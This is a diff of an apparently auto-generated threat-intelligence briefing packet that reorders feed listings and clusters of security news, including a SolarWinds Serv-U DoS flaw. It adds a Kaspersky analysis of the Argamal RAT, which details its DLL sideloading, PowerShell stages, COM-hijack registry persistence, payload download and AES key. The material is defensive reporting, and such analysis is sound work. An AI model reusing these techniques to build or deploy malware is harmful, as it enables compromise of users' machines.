@@ -1,6 +1,6 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-06-07T20:19:23.263626+00:00
+- Generated: 2026-06-07T22:11:38.401712+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
@@ -80,46 +80,31 @@
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Microsoft Security Blog** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 4
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
+  - In window count: 1
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 1
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Microsoft Security Blog** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 3
+  - In window count: 4
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
@@ -130,16 +115,31 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 3
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
@@ -155,6 +155,16 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: ok
+  - Item count: 78
+  - In window count: 0
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
@@ -165,38 +175,23 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: ok
-  - Item count: 78
-  - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 3
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 0
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 4
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -205,6 +200,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -275,6 +275,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 3
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
@@ -285,11 +290,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
-  - Item count: 20
-  - In window count: 1
+  - Item count: 10
+  - In window count: 3
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
@@ -300,46 +305,36 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 16
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - URL: https://www.securityweek.com/feed/
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
   - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 5
+  - In window count: 5
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 16
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: ok
@@ -350,8 +345,18 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -360,26 +365,21 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 24
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
-  - Status: ok
-  - Item count: 10
-  - In window count: 6
 - **Krebs on Security** (practitioner_analysis)
   - URL: https://krebsonsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 6
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -395,16 +395,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 3
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 46
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 33
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 46
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -477,7 +477,7 @@
 - Anchor signal: Palo Alto Networks
 - Theme key: palo-alto-networks
 - Cluster count: 11
-- Article count: 19
+- Article count: 18
 - Cohesion: 0.246
 - Shared strong signals: Palo Alto Networks
 - Member CVEs: CVE-2024-21182, CVE-2026-39987
@@ -488,7 +488,7 @@
   - affected_products: Palo Alto Networks, GitHub
   - cve_ids: CVE-2026-0257, CVE-2024-21182, CVE-2026-39987
   - urgency_signals: actively_exploited, zero_day, preauth_unauth
-- Cluster IDs: df6874157e, 791da8c978, 5c65105996, 001d61d9b2, a8a021acdc, 9aa815a49a, 4faddc63ad, c37232a3fc, fdf9413677, 0018093ec7, ad4a52246a
+- Cluster IDs: df6874157e, 791da8c978, 001d61d9b2, 5c65105996, a8a021acdc, 9aa815a49a, 4faddc63ad, c37232a3fc, fdf9413677, 0018093ec7, ad4a52246a
 - Links:
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
   - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
@@ -498,10 +498,9 @@
   - https://risky.biz/RBNEWS571/
   - https://cyberscoop.com/palo-alto-networks-cve-2026-0257-exploited-vulnerability/
   - https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
   - https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
   - https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/
-  - https://www.reddit.com/r/cybersecurity/comments/1tye11l/cisa_hackers_now_exploit_solarwinds_servu_flaw_to/
-  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
   - https://thehackernews.com/2026/06/google-june-2026-android-update-patches.html
   - https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
   - https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html
@@ -796,11 +795,7 @@
 
 ### Persistence (0)
 
-### Tier inversion (2)
-- **CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog**
-  - Cluster: 5c65105996
-  - Primary source: The Hacker News
-  - Strong signals: CVE-2024-21182, CVE-2026-0257, CVE-2026-28318, CVE-2026-39987, CVE-2026-45659, Cl0p
+### Tier inversion (1)
 - **CVE-2026-46640: Developing payloads for Twig sandbox bypass**
   - Cluster: a5c944a483
   - Primary source: Reddit r/netsec
@@ -1293,67 +1288,6 @@ CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog  Ravie Lak
   - Link: https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
   - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted
 
-### Cluster 5c65105996 — score 20
-
-- Title: CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-06-06T08:14:31+00:00
-- Link: https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
-- Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
-- Strong signals: CVE-2026-28318, SolarWinds
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, cryptojacking, ddos, mfa_bypass, phishing_social_eng, ransomware_extortion, supply_chain, vulnerability_disclosure, zero_day
-- actor_attribution: Cl0p
-- affected_industries: government
-- affected_products: Microsoft SharePoint, Palo Alto Networks, SolarWinds
-- cve_ids: CVE-2024-21182, CVE-2026-0257, CVE-2026-28318, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news, tier_5_chatter
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, ddos, cryptojacking, mfa_bypass, vulnerability_disclosure, active_exploitation
-- actor_attribution: Cl0p
-- affected_industries: government
-- affected_products: SolarWinds, Microsoft SharePoint, Palo Alto Networks
-- cve_ids: CVE-2026-28318, CVE-2024-21182, CVE-2026-0257, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash
-```
-
-#### Full body
-
-```
-CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. "SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate," SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing "content-encoding" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in Minutes (See the Demo) [Guide] The Real Security Risks of Shadow AI (And Where You’re Exposed)
-```
-
-#### Corroborating sources (3)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog
-  - Published: 2026-06-06T08:14:31+00:00
-  - Link: https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
-  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers
-  - Published: 2026-06-05T19:15:30+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/
-  - Summary: CISA warned today that hackers are now actively exploiting a recently patched high-severity SolarWinds Serv-U flaw to crash servers. [...]
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - Title: CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers
-  - Published: 2026-06-06T10:49:46+00:00
-  - Link: https://www.reddit.com/r/cybersecurity/comments/1tye11l/cisa_hackers_now_exploit_solarwinds_servu_flaw_to/
-  - Summary: submitted by /u/Doug24 [link] [comments]
-
 ### Cluster cc7cd597eb — score 20
 
 - Title: Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms
@@ -1500,6 +1434,62 @@ Home Blog When "Moderate" Means "Sometimes" Published: June 2, 2026 When "Modera
   - Published: 2026-06-02T14:00:00+00:00
   - Link: https://www.huntress.com/blog/unpatched-ntlm-coercion-windows-search-uri-handler
   - Summary: The same NTLM coercion primitive that got patched in the Snipping Tool exists in Windows Explorer's search: handler. No CVE. No fix. If your patching relies on CVE coverage, you have a blind spot.
+
+### Cluster 5c65105996 — score 18
+
+- Title: CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-06-06T08:14:31+00:00
+- Link: https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
+- Fetch status: ok
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: CVE-2026-28318, SolarWinds
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, cryptojacking, ddos, mfa_bypass, phishing_social_eng, ransomware_extortion, supply_chain, vulnerability_disclosure, zero_day
+- actor_attribution: Cl0p
+- affected_industries: government
+- affected_products: Microsoft SharePoint, Palo Alto Networks, SolarWinds
+- cve_ids: CVE-2024-21182, CVE-2026-0257, CVE-2026-28318, CVE-2026-39987, CVE-2026-45659
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, ddos, cryptojacking, mfa_bypass, vulnerability_disclosure, active_exploitation
+- actor_attribution: Cl0p
+- affected_industries: government
+- affected_products: SolarWinds, Microsoft SharePoint, Palo Alto Networks
+- cve_ids: CVE-2026-28318, CVE-2024-21182, CVE-2026-0257, CVE-2026-39987, CVE-2026-45659
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash
+```
+
+#### Full body
+
+```
+CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. "SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate," SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing "content-encoding" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in Minutes (See the Demo) [Guide] The Real Security Risks of Shadow AI (And Where You’re Exposed)
+```
+
+#### Corroborating sources (2)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog
+  - Published: 2026-06-06T08:14:31+00:00
+  - Link: https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
+  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers
+  - Published: 2026-06-05T19:15:30+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/
+  - Summary: CISA warned today that hackers are now actively exploiting a recently patched high-severity SolarWinds Serv-U flaw to crash servers. [...]
 
 ### Cluster a8a021acdc — score 18
 
@@ -2384,6 +2374,45 @@ Winning the cyber marathon with Tony Giandomenico By Amy Ciminnisi Thursday, Jun
   - Link: https://blog.talosintelligence.com/winning-the-cyber-marathon-with-tony-giandomenico/
   - Summary: Tony Giandomenico, Senior Director of Product Management, joins Amy to discuss the Talos Threat Hunting launch what he's excited about for the future of cybersecurity, and, of course, his Ironman triathlons.
 
+### Cluster f9c11bd945 — score 10
+
+- Title: Argamal: Malware hidden in hentai games
+- Source: Kaspersky Securelist (threat_research_primary)
+- Published: 2026-06-03T09:00:22+00:00
+- Link: https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: threat_research
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- content_type: threat_research
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.
+```
+
+#### Full body
+
+```
+Table of Contents Technical details Background Delivery Script executor Malicious agent Other delivery methods Infrastructure Victims Attribution Conclusions Indicators of Compromise Authors Mikhail Reznichenko In April 2026, we discovered a new malware campaign targeting players of “hentai” games. Once launched, the infected games install a previously unknown malicious implant on the user’s machine. After a few days, the implant downloads and executes a Trojan, resulting in full system compromise and broad remote control capabilities for the attackers. We dubbed this malware family “Argamal”. The malware uses COM hijacking to persist on the victim’s machine, replacing the InprocServer32 entry for Windows Color System Calibration Loader DLL. This task is triggered when the user logs in, effectively allowing the malware to run at startup. Kaspersky solutions detect this threat as Trojan.Win32.Termixia.* , Trojan.Win32.Agent.* , HEUR:Trojan.Win32.Argamal.gen and HEUR:Trojan-Downloader.Win32.Argamal.gen . Technical details Background In April, as part of our ongoing monitoring of telemetry data, we found some suspicious DLLs. Further analysis revealed that various versions of these DLLs have existed since at least 2024. The DLLs were spawned by different games written using various game engines and programming languages, including RenPy (Python) and RPG Maker MV (JavaScript), among others. However, they all had one thing in common: they were all hentai games. We searched for the distribution sources and found a number of websites hosting game screenshots and download links. These links redirected users to PixelDrain, a free file transfer service. Adult games catalogue In addition to these websites, the trojanized games have also been distributed via different torrent trackers, including AniRena. Malicious game torrent in AniRena Delivery Both the dedicated websites and torrents delivered an archive containing the infected game. Contents of the game archive This archive contained fully functional, legitimate game files, as well as a modified FFmpeg DLL (SHA1: 42add9475e67a1ccc6a6af94b5475d3defc01b85 ), that imported the DllGetClassObject function from a file called natives2_blob.bin . Since the game needs ffmpeg.dll to run properly, the library loads as soon as the user starts the game. Script executor The natives2_blob.bin (SHA1: edce72f59e4c1d136cd1946af70d334c19df858d ) file is a DLL that executes a Base64-encoded PowerShell script when loaded. The natives2_blob.bin file code This PowerShell script, which we’ll call Stage1 , performs basic checks for controlled environments. For example, it checks for the Sandboxie folder in Program Files and Procmon64 in the process list. If all the checks indicate that the process is not running in a controlled environment, it proceeds to establish persistence. Stage1 sets the MI_V environment variable (and also MI_V2 in the new versions of malware) for the current user to another Base64-encoded PowerShell script, which we’ll call Stage2 . After that, it sets the InprocServer32 registry key at HKCU\SOFTWARE\Classes\CLSID\{722D0F89-B69C-4700-AE8C-4A44350E4876} to a random DLL file name in a random subdirectory of %USER%\AppData\Local , as well as the ShellFolder subkey to another random DLL file name in the same location. Stage1 also creates a scheduled task that will execute three days later. This task executes Stage2 and runs once. Stage2 is a payload downloader script. It takes previously generated DLL filenames from the registry and downloads an encrypted payload called zaesdl.dat from GitHub using bitsadmin.exe . The downloaded payload is saved in the settings.dat file in the randomly chosen subdirectory of %USER%\AppData\Local . Stage2 decrypts it using AES-CBC with the key zbcd1j9234r670eh and an IV equal to the key. The decrypted payload is then saved in the DLL file specified in the ShellFolder registry subkey. The decrypted payload is set as InprocServer32 at HKCU\SOFTWARE\Classes\CL
+```
+
+#### Corroborating sources (1)
+
